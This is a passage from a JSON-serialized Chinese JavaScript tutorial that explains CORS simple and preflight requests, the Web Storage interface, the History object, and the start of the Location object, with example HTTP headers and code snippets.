request）。</p>\n<p>只要同时满足以下两大条件，就属于简单请求。</p>\n<p>（1）请求方法是以下三种方法之一。</p>\n<blockquote>\n<ul>\n<li>HEAD</li>\n<li>GET</li>\n<li>POST</li>\n</ul>\n</blockquote>\n<p>（2）HTTP 的头信息不超出以下几种字段。</p>\n<blockquote>\n<ul>\n<li>Accept</li>\n<li>Accept-Language</li>\n<li>Content-Language</li>\n<li>Last-Event-ID</li>\n<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>\n</ul>\n</blockquote>\n<p>凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。</p>\n<p>这样划分的原因是，表单在历史上一直可以跨域发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。</p>\n\n        <h2>\n            <a href='#简单请求' class='header-anchor'>#</a>\n            <span>简单请求</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本流程' class='header-anchor'>#</a>\n            <span>基本流程</span>\n        </h3>\n    <p>对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。</p>\n<p>下面是一个例子，浏览器发现这次跨域 AJAX 请求是简单请求，就自动在头信息之中，添加一个<code>Origin</code>字段。</p>\n<pre class=\"prettyprint language-http\"><code>GET /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...</code></pre><p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>\n<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。</p>\n<p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>\n<pre class=\"prettyprint language-http\"><code>Access-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Expose-Headers: FooBar\nContent-Type: text/html; charset=utf-8</code></pre><p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以<code>Access-Control-</code>开头。</p>\n<p><strong>（1）<code>Access-Control-Allow-Origin</code></strong></p>\n<p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>\n<p><strong>（2）<code>Access-Control-Allow-Credentials</code></strong></p>\n<p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为<code>true</code>，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送 Cookie，不发送该字段即可。</p>\n<p><strong>（3）<code>Access-Control-Expose-Headers</code></strong></p>\n<p>该字段可选。CORS 请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个服务器返回的基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p>\n\n        <h3>\n            <a href='#withCredentials-属性' class='header-anchor'>#</a>\n            <span>withCredentials 属性</span>\n        </h3>\n    <p>上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等）。如果需要包含 Cookie 信息，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p>\n<pre class=\"prettyprint language-http\"><code>Access-Control-Allow-Credentials: true</code></pre><p>另一方面，开发者必须在 AJAX 请求中打开<code>withCredentials</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.withCredentials = true;</code></pre><p>否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p>\n<p>但是，如果省略<code>withCredentials</code>设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>xhr.withCredentials = false;</code></pre><p>需要注意的是，如果要发送 Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨域）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的 Cookie。</p>\n\n        <h2>\n            <a href='#非简单请求' class='header-anchor'>#</a>\n            <span>非简单请求</span>\n        </h2>\n    \n        <h3>\n            <a href='#预检请求' class='header-anchor'>#</a>\n            <span>预检请求</span>\n        </h3>\n    <p>非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p>\n<p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的<code>XMLHttpRequest</code>请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器大量收到<code>DELETE</code>和<code>PUT</code>请求，这些传统的表单不可能跨域发出的请求。</p>\n<p>下面是一段浏览器的 JavaScript 脚本。</p>\n<pre class=\"prettyprint language-javascript\"><code>var url = &#039;http://api.alice.com/cors&#039;;\nvar xhr = new XMLHttpRequest();\nxhr.open(&#039;PUT&#039;, url, true);\nxhr.setRequestHeader(&#039;X-Custom-Header&#039;, &#039;value&#039;);\nxhr.send();</code></pre><p>上面代码中，HTTP 请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>\n<p>浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。</p>\n<pre class=\"prettyprint language-http\"><code>OPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: X-Custom-Header\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...</code></pre><p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p>\n<p>除了<code>Origin</code>字段，“预检”请求的头信息包括两个特殊字段。</p>\n<p><strong>（1）<code>Access-Control-Request-Method</code></strong></p>\n<p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是<code>PUT</code>。</p>\n<p><strong>（2）<code>Access-Control-Request-Headers</code></strong></p>\n<p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>\n\n        <h3>\n            <a href='#预检请求的回应' class='header-anchor'>#</a>\n            <span>预检请求的回应</span>\n        </h3>\n    <p>服务器收到“预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>\n<pre class=\"prettyprint language-http\"><code>HTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: X-Custom-Header\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain</code></pre><p>上面的 HTTP 回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>\n<pre class=\"prettyprint language-http\"><code>Access-Control-Allow-Origin: *</code></pre><p>如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。</p>\n<pre class=\"prettyprint language-http\"><code>OPTIONS http://api.bob.com HTTP/1.1\nStatus: 200\nAccess-Control-Allow-Origin: https://notyourdomain.com\nAccess-Control-Allow-Method: POST</code></pre><p>上面的服务器回应，<code>Access-Control-Allow-Origin</code>字段明确不包括发出请求的<code>http://api.bob.com</code>。</p>\n<p>这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>\n<pre class=\"prettyprint language-bash\"><code>XMLHttpRequest cannot load http://api.alice.com.\nOrigin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</code></pre><p>服务器回应的其他 CORS 相关字段如下。</p>\n<pre class=\"prettyprint language-http\"><code>Access-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: X-Custom-Header\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 1728000</code></pre><p><strong>（1）<code>Access-Control-Allow-Methods</code></strong></p>\n<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。</p>\n<p><strong>（2）<code>Access-Control-Allow-Headers</code></strong></p>\n<p>如果浏览器请求包括<code>Access-Control-Request-Headers</code>字段，则<code>Access-Control-Allow-Headers</code>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。</p>\n<p><strong>（3）<code>Access-Control-Allow-Credentials</code></strong></p>\n<p>该字段与简单请求时的含义相同。</p>\n<p><strong>（4）<code>Access-Control-Max-Age</code></strong></p>\n<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>\n\n        <h3>\n            <a href='#浏览器的正常请求和回应' class='header-anchor'>#</a>\n            <span>浏览器的正常请求和回应</span>\n        </h3>\n    <p>一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>\n<p>下面是“预检”请求之后，浏览器的正常 CORS 请求。</p>\n<pre class=\"prettyprint language-http\"><code>PUT /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nX-Custom-Header: value\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...</code></pre><p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>\n<p>下面是服务器正常的回应。</p>\n<pre class=\"prettyprint language-http\"><code>Access-Control-Allow-Origin: http://api.bob.com\nContent-Type: text/html; charset=utf-8</code></pre><p>上面头信息中，<code>Access-Control-Allow-Origin</code>字段是每次回应都必定包含的。</p>\n\n        <h2>\n            <a href='#与-JSONP-的比较' class='header-anchor'>#</a>\n            <span>与 JSONP 的比较</span>\n        </h2>\n    <p>CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持<code>GET</code>请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Monsur Hossain, <a href=\"http://www.html5rocks.com/en/tutorials/cors/\">Using CORS</a></li>\n<li>MDN, <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS\">HTTP access control (CORS)</a></li>\n<li>Ryan Miller, <a href=\"https://frontendian.co/cors\">CORS</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"Storage 接口","link":"/bom/storage.html"}],"content":"\n        <h1>\n            <a href='#Storage-接口' class='header-anchor'>#</a>\n            <span>Storage 接口</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>Storage 接口用于脚本在浏览器保存数据。两个对象部署了这个接口：<code>window.sessionStorage</code>和<code>window.localStorage</code>。</p>\n<p><code>sessionStorage</code>保存的数据用于浏览器的一次会话（session），当会话结束（通常是窗口关闭），数据被清空；<code>localStorage</code>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的其他方面都一致。</p>\n<p>保存的数据都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。</p>\n<p>这个接口很像 Cookie 的强化版，能够使用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，Firefox 中，<code>a.example.com</code>和<code>b.example.com</code>共享 5MB 的存储空间。另外，与 Cookie 一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取，如果跨域操作会报错。</p>\n\n        <h2>\n            <a href='#属性和方法' class='header-anchor'>#</a>\n            <span>属性和方法</span>\n        </h2>\n    <p>Storage 接口只有一个属性。</p>\n<ul>\n<li><code>Storage.length</code>：返回保存的数据项个数。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>window.localStorage.setItem(&#039;foo&#039;, &#039;a&#039;);\nwindow.localStorage.setItem(&#039;bar&#039;, &#039;b&#039;);\nwindow.localStorage.setItem(&#039;baz&#039;, &#039;c&#039;);\n\nwindow.localStorage.length // 3</code></pre><p>该接口提供5个方法。</p>\n\n        <h3>\n            <a href='#Storage.setItem()' class='header-anchor'>#</a>\n            <span>Storage.setItem()</span>\n        </h3>\n    <p><code>Storage.setItem()</code>方法用于存入数据。它接受两个参数，第一个是键名，第二个是保存的数据。如果键名已经存在，该方法会更新已有的键值。该方法没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.sessionStorage.setItem(&#039;key&#039;, &#039;value&#039;);\nwindow.localStorage.setItem(&#039;key&#039;, &#039;value&#039;);</code></pre><p>注意，<code>Storage.setItem()</code>两个参数都是字符串。如果不是字符串，会自动转成字符串，再存入浏览器。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.sessionStorage.setItem(3, { foo: 1 });\nwindow.sessionStorage.getItem(&#039;3&#039;) // &quot;[object Object]&quot;</code></pre><p>上面代码中，<code>setItem</code>方法的两个参数都不是字符串，但是存入的值都是字符串。</p>\n<p>如果储存空间已满，该方法会抛错。</p>\n<p>写入不一定要用这个方法，直接赋值也是可以的。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 下面三种写法等价\nwindow.localStorage.foo = &#039;123&#039;;\nwindow.localStorage[&#039;foo&#039;] = &#039;123&#039;;\nwindow.localStorage.setItem(&#039;foo&#039;, &#039;123&#039;);</code></pre>\n        <h3>\n            <a href='#Storage.getItem()' class='header-anchor'>#</a>\n            <span>Storage.getItem()</span>\n        </h3>\n    <p><code>Storage.getItem()</code>方法用于读取数据。它只有一个参数，就是键名。如果键名不存在，该方法返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.sessionStorage.getItem(&#039;key&#039;)\nwindow.localStorage.getItem(&#039;key&#039;)</code></pre><p>键名应该是一个字符串，否则会被自动转为字符串。</p>\n\n        <h3>\n            <a href='#Storage.removeItem()' class='header-anchor'>#</a>\n            <span>Storage.removeItem()</span>\n        </h3>\n    <p><code>Storage.removeItem()</code>方法用于清除某个键名对应的键值。它接受键名作为参数，如果键名不存在，该方法不会做任何事情。</p>\n<pre class=\"prettyprint language-javascript\"><code>sessionStorage.removeItem(&#039;key&#039;);\nlocalStorage.removeItem(&#039;key&#039;);</code></pre>\n        <h3>\n            <a href='#Storage.clear()' class='header-anchor'>#</a>\n            <span>Storage.clear()</span>\n        </h3>\n    <p><code>Storage.clear()</code>方法用于清除所有保存的数据。该方法的返回值是<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.sessionStorage.clear()\nwindow.localStorage.clear()</code></pre>\n        <h3>\n            <a href='#Storage.key()' class='header-anchor'>#</a>\n            <span>Storage.key()</span>\n        </h3>\n    <p><code>Storage.key()</code>接受一个整数作为参数（从零开始），返回该位置对应的键值。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.sessionStorage.setItem(&#039;key&#039;, &#039;value&#039;);\nwindow.sessionStorage.key(0) // &quot;key&quot;</code></pre><p>结合使用<code>Storage.length</code>属性和<code>Storage.key()</code>方法，可以遍历所有的键。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; window.localStorage.length; i++) {\n  console.log(localStorage.key(i));\n}</code></pre>\n        <h2>\n            <a href='#storage-事件' class='header-anchor'>#</a>\n            <span>storage 事件</span>\n        </h2>\n    <p>Storage 接口储存的数据发生变化时，会触发 storage 事件，可以指定这个事件的监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;storage&#039;, onStorageChange);</code></pre><p>监听函数接受一个<code>event</code>实例对象作为参数。这个实例对象继承了 StorageEvent 接口，有几个特有的属性，都是只读属性。</p>\n<ul>\n<li><code>StorageEvent.key</code>：字符串，表示发生变动的键名。如果 storage 事件是由<code>clear()</code>方法引起，该属性返回<code>null</code>。</li>\n<li><code>StorageEvent.newValue</code>：字符串，表示新的键值。如果 storage 事件是由<code>clear()</code>方法或删除该键值对引发的，该属性返回<code>null</code>。</li>\n<li><code>StorageEvent.oldValue</code>：字符串，表示旧的键值。如果该键值对是新增的，该属性返回<code>null</code>。</li>\n<li><code>StorageEvent.storageArea</code>：对象，返回键值对所在的整个对象。也说是说，可以从这个属性上面拿到当前域名储存的所有键值对。</li>\n<li><code>StorageEvent.url</code>：字符串，表示原始触发 storage 事件的那个网页的网址。</li>\n</ul>\n<p>下面是<code>StorageEvent.key</code>属性的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function onStorageChange(e) {\n  console.log(e.key);\n}\n\nwindow.addEventListener(&#039;storage&#039;, onStorageChange);</code></pre><p>注意，该事件有一个很特别的地方，就是它不在导致数据变化的当前页面触发，而是在同一个域名的其他窗口触发。也就是说，如果浏览器只打开一个窗口，可能观察不到这个事件。比如同时打开多个窗口，当其中的一个窗口导致储存的数据发生改变时，只有在其他窗口才能观察到监听函数的执行。可以通过这种机制，实现多个窗口之间的通信。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ryan Stewart，<a href=\"http://www.adobe.com/devnet/html5/articles/html5-storage-apis.html\">Introducing the HTML5 storage APIs</a></li>\n<li><a href=\"http://codular.com/localstorage\">Getting Started with LocalStorage</a></li>\n<li>Feross Aboukhadijeh, <a href=\"http://feross.org/fill-disk/\">Introducing the HTML5 Hard Disk Filler™ API</a></li>\n<li>Ben Summers, <a href=\"http://bens.me.uk/2013/localstorage-inter-window-messaging\">Inter-window messaging using localStorage</a></li>\n<li>Stack Overflow, <a href=\"http://stackoverflow.com/questions/18265556/why-does-internet-explorer-fire-the-window-storage-event-on-the-window-that-st\">Why does Internet Explorer fire the window “storage” event on the window that stored the data?</a></li>\n<li>Stack Overflow, <a href=\"https://stackoverflow.com/questions/5370784/localstorage-eventlistener-is-not-called\">localStorage eventListener is not called</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"History 对象","link":"/bom/history.html"}],"content":"\n        <h1>\n            <a href='#History-对象' class='header-anchor'>#</a>\n            <span>History 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>window.history</code>属性指向 History 对象，它表示当前窗口的浏览历史。</p>\n<p>History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.history.length // 3</code></pre><p>由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 后退到前一个网址\nhistory.back()\n\n// 等同于\nhistory.go(-1)</code></pre><p>浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。</p>\n\n        <h2>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h2>\n    <p>History 对象主要有两个属性。</p>\n<ul>\n<li><code>History.length</code>：当前窗口访问过的网址数量（包括当前网页）</li>\n<li><code>History.state</code>：History 堆栈最上层的状态值（详见下文）</li>\n</ul>\n\n        <h2>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#History.back()、History.forward()、History.go()' class='header-anchor'>#</a>\n            <span>History.back()、History.forward()、History.go()</span>\n        </h3>\n    <p>这三个方法用于在历史之中移动。</p>\n<ul>\n<li><code>History.back()</code>：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。</li>\n<li><code>History.forward()</code>：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。</li>\n<li><code>History.go()</code>：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如<code>go(1)</code>相当于<code>forward()</code>，<code>go(-1)</code>相当于<code>back()</code>。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为<code>0</code>，相当于刷新当前页面。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>history.back();\nhistory.forward();\nhistory.go(-2);</code></pre><p><code>history.go(0)</code>相当于刷新当前页面。</p>\n<pre class=\"prettyprint language-javascript\"><code>history.go(0);记录</code></pre><p>注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。</p>\n\n        <h3>\n            <a href='#History.pushState()，' class='header-anchor'>#</a>\n            <span>History.pushState()，</span>\n        </h3>\n    <p><code>History.pushState()</code>方法用于在历史中添加一条记录。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.history.pushState(state, title, url)</code></pre><p>该方法接受三个参数，依次为：</p>\n<ul>\n<li><code>state</code>：一个与添加的记录相关联的状态对象，主要用于<code>popstate</code>事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填<code>null</code>。</li>\n<li><code>title</code>：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。</li>\n<li><code>url</code>：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。</li>\n</ul>\n<p>假定当前网址是<code>example.com/1.html</code>，使用<code>pushState()</code>方法在浏览记录（History 对象）中添加一个新记录。</p>\n<pre class=\"prettyprint language-javascript\"><code>var stateObj = { foo: &#039;bar&#039; };\nhistory.pushState(stateObj, &#039;page 2&#039;, &#039;2.html&#039;);</code></pre><p>添加新记录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但并不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问<code>google.com</code>)，然后点击了倒退按钮，页面的 URL 将显示<code>2.html</code>；你再点击一次倒退按钮，URL 将显示<code>1.html</code>。</p>\n<p>总之，<code>pushState()</code>方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。</p>\n<p>使用该方法之后，就可以用<code>History.state</code>属性读出状态对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var stateObj = { foo: &#039;bar&#039; };\nhistory.pushState(stateObj, &#039;page 2&#039;, &#039;2.html&#039;);\nhistory.state // {foo: &quot;bar&quot;}</code></pre><p>如果<code>pushState</code>的 URL 参数设置了一个新的锚点值（即<code>hash</code>），并不会触发<code>hashchange</code>事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。</p>\n<p>如果<code>pushState()</code>方法设置了一个跨域网址，则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\n// 当前网址为 http://example.com\nhistory.pushState(null, &#039;&#039;, &#039;https://twitter.com/hello&#039;);</code></pre><p>上面代码中，<code>pushState</code>想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。</p>\n\n        <h3>\n            <a href='#History.replaceState()' class='header-anchor'>#</a>\n            <span>History.replaceState()</span>\n        </h3>\n    <p><code>History.replaceState()</code>方法用来修改 History 对象的当前记录，其他都与<code>pushState()</code>方法一模一样。</p>\n<p>假定当前网页是<code>example.com/example.html</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>history.pushState({page: 1}, &#039;title 1&#039;, &#039;?page=1&#039;)\n// URL 显示为 http://example.com/example.html?page=1\n\nhistory.pushState({page: 2}, &#039;title 2&#039;, &#039;?page=2&#039;);\n// URL 显示为 http://example.com/example.html?page=2\n\nhistory.replaceState({page: 3}, &#039;title 3&#039;, &#039;?page=3&#039;);\n// URL 显示为 http://example.com/example.html?page=3\n\nhistory.back()\n// URL 显示为 http://example.com/example.html?page=1\n\nhistory.back()\n// URL 显示为 http://example.com/example.html\n\nhistory.go(2)\n// URL 显示为 http://example.com/example.html?page=3</code></pre>\n        <h2>\n            <a href='#popstate-事件' class='header-anchor'>#</a>\n            <span>popstate 事件</span>\n        </h2>\n    <p>每当同一个文档的浏览历史（即<code>history</code>对象）出现变化时，就会触发<code>popstate</code>事件。</p>\n<p>注意，仅仅调用<code>pushState()</code>方法或<code>replaceState()</code>方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用<code>History.back()</code>、<code>History.forward()</code>、<code>History.go()</code>方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。</p>\n<p>使用的时候，可以为<code>popstate</code>事件指定回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onpopstate = function (event) {\n  console.log(&#039;location: &#039; + document.location);\n  console.log(&#039;state: &#039; + JSON.stringify(event.state));\n};\n\n// 或者\nwindow.addEventListener(&#039;popstate&#039;, function(event) {\n  console.log(&#039;location: &#039; + document.location);\n  console.log(&#039;state: &#039; + JSON.stringify(event.state));\n});</code></pre><p>回调函数的参数是一个<code>event</code>事件对象，它的<code>state</code>属性指向<code>pushState</code>和<code>replaceState</code>方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的<code>event.state</code>，就是通过<code>pushState</code>和<code>replaceState</code>方法，为当前 URL 绑定的<code>state</code>对象。</p>\n<p>这个<code>state</code>对象也可以直接通过<code>history</code>对象读取。</p>\n<pre class=\"prettyprint language-javascript\"><code>var currentState = history.state;</code></pre><p>注意，页面第一次加载的时候，浏览器不会触发<code>popstate</code>事件。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"Location 对象，URL 对象，URLSearchParams 对象","link":"/bom/location.html"}],"content":"\n        <h1>\n            <a href='#Location-对象，URL-对象，URLSearchParams-对象' class='header-anchor'>#</a>\n            <span>Location 对象，URL 对象，URLSearchParams 对象</span>\n        </h1>\n    <p>URL 是互联网的基础设施之一。浏览器提供了一些原生对象，用来管理 URL。</p>\n\n        <h2>\n            <a href='#Location-对象' class='header-anchor'>#</a>\n            <span>Location 对象</span>\n        </h2>\n    <p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>\n\n        <h3>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h3>\n    <p><code>Location</code>对象提供以下属性。</p>\n<ul>\n<li>Location.href：整个 URL。</li>\n<li>Location.protocol：当前 URL 的协议，包括冒号（<code>:</code>）。</li>\n<li>Location.host：主机，包括冒号（<code>:</code>）和端口（默认的80端口和443端口会省略）。</li>\n<li>Location.hostname：主机名，不包括端口。</li>\n<li>Location.port：端口号。</li>\n<li>Location.pathname：URL 的路径部分，从根路径<code>/</code>开始。</li>\n<li>Location.search：查询字符串部分，从问号<code>?</code>开始。</li>\n<li>Location.hash：片段字符串部分，从<code>#</code>开始。</li>\n<li>Location.username：域名前面的用户名。</li>\n<li>Location.password：域名前面的密码。</li>\n<li>Location.origin：URL 的协议、主机名和端口。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// 当前网址为\n// http://user:passwd@www.example.com:4097/path/a.html?x=111#part1\ndocument.location.href\n// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;\ndocument.location.protocol\n// &quot;http:&quot;\ndocument.location.host\n// &quot;www.example.com:4097&quot;\ndocument.location.hostname\n// &quot;www.example.com&quot;\ndocument.location.port\n// &quot;4097&quot;\ndocument.location.pathname\n// &quot;/path/a.html&quot;\ndocument.location.search\n// &quot;?x=111&quot;\ndocument.location.hash\n// &quot;#part1&quot;\ndocument.location.username\n// &quot;user&quot;\ndocument.location.password\n// 